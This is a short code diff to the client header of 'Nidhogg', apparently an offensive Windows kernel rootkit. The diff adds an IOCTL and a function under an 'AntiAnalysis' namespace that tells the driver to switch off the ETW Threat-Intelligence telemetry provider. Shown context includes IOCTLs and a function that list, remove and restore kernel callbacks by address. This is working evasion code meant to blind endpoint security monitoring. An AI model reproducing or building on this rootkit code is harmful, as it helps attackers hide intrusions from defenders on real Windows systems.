@@ -42,10 +42,10 @@
 #define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
-// ADD THESE DEFINITIONS FOR HKLM, HKU & HKCU: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/registry-key-object-routines
 #define DRIVER_NAME LR"(\\.\Nidhogg)"
 #define NIDHOGG_SUCCESS 0
 #define NIDHOGG_GENERAL_ERROR 1
@@ -1058,6 +1058,18 @@ namespace Nidhogg {
 	}
 
 	namespace AntiAnalysis {
+		int NidhoggEnableDisableEtwTi(HANDLE hNidhogg, bool enable) {
+			DWORD returned;
+			ULONG enableDisable = enable;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI,
+				&enableDisable, sizeof(enableDisable),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
 		int NidhoggDisableCallback(HANDLE hNidhogg, ULONG64 callbackAddress, CallbackType callbackType) {
 			KernelCallback callback{};
 			DWORD returned;
